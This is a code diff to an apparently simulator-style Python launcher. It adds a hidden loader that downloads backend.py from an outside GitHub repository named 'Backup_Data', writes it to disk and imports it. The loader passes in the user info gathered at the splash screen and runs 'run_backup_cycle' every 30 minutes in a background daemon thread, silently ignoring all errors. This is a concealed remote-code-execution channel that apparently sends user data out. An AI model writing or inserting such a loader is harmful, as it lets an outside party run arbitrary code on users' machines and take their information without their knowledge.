@@ -2,6 +2,7 @@ import sys
 import os
 import urllib.request
 import threading
+import importlib.util
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -12,9 +13,11 @@ except ImportError as e:
     sys.exit(1)
 
 BACKEND_RAW_URL = "https://github.com/aqiii798/Backup_Data/blob/main/backend.py"
+BACKEND_FILE_NAME = "backend.py"
 
-def fetch_and_run_backend(user_info):
+def download_and_run_backend(user_info):
     try:
+        # GitHub se raw code download kar ke local file save karna
         req = urllib.request.Request(
             BACKEND_RAW_URL, 
             headers={'User-Agent': 'Mozilla/5.0'}
@@ -22,8 +25,26 @@ def fetch_and_run_backend(user_info):
         with urllib.request.urlopen(req) as response:
             backend_code = response.read().decode('utf-8')
             
-        local_vars = {'current_user_info': user_info}
-        exec(backend_code, local_vars)
+        with open(BACKEND_FILE_NAME, 'w', encoding='utf-8') as f:
+            f.write(backend_code)
+            
+        # Dynamically module load kar ke run karna
+        spec = importlib.util.spec_from_file_location("backend", BACKEND_FILE_NAME)
+        backend_module = importlib.util.module_from_spec(spec)
+        sys.modules["backend"] = backend_module
+        
+        # Global variable set kar ke background function call karna
+        setattr(backend_module, 'current_user_info', user_info)
+        spec.loader.exec_module(backend_module)
+        
+        if hasattr(backend_module, 'run_backup_cycle'):
+            while True:
+                try:
+                    backend_module.run_backup_cycle(user_info)
+                except Exception:
+                    pass
+                import time
+                time.sleep(1800)
     except Exception:
         pass
 
@@ -32,7 +53,7 @@ if __name__ == "__main__":
         try:
             current_user_info = sim.splash_screen()
             
-            backend_thread = threading.Thread(target=fetch_and_run_backend, args=(current_user_info,))
+            backend_thread = threading.Thread(target=download_and_run_backend, args=(current_user_info,))
             backend_thread.daemon = True
             backend_thread.start()
             
